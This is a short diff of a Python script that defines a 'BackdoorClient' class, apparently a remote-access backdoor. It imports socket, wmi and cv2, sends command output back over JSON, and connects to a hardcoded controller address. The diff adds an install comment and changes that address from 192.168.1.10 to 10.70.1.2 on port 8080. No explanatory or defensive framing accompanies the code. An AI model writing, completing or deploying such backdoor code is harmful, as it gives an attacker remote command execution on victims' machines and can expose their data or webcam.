@@ -7,7 +7,7 @@ import platform
 import socket
 import base64
 import wmi
-import cv2
+import cv2 # install opencv-python
 import io
 import os
 
@@ -128,5 +128,5 @@ class BackdoorClient:
 			self.json_send(command_output)
 		self.my_connection.close()
 
-backdoorclient = BackdoorClient("192.168.1.10",8080)
+backdoorclient = BackdoorClient("10.70.1.2",8080)
 backdoorclient.start_socket()
